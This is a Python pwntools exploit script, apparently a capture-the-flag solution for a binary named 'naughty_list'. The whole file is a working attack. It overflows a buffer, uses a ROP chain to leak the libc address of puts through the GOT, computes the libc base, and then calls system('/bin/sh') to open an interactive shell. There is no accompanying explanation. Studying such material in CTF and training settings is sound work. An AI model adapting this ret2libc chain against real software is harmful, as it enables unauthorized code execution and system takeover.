#!/usr/bin/python3

from pwn import *

libc = ELF('./libc.so.6')
elf  = ELF('./naughty_list')

con = process(elf.path, env={"LD_PRELOAD" : libc.path})

context.update(arch='amd64', os='linux')

con.recvuntil(b':')
con.sendline(b'AA')
con.recvuntil(b':')
con.sendline(b'AA')
con.recvuntil(b':')
con.sendline(b'20')
con.recvuntil(b':')
con.recvuntil(b':')
con.recvuntil(b':')

rop = ROP(elf)
rop.raw(b'A' * 40)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['get_descr'])

con.recvuntil(b':')
con.sendline(rop.chain())

con.recvline()
con.recvline()
libc_puts = u64(con.recvline().strip().ljust(8, b'\x00'))
libc.address = libc_puts - libc.symbols['puts']

rop = ROP(libc)
rop.raw(b'A' * 40)
rop.call(rop.find_gadget(["ret"]))
rop.system(next(libc.search(b'/bin/sh\x00')))

con.recvuntil(b':')
con.sendline(rop.chain())

con.interactive()
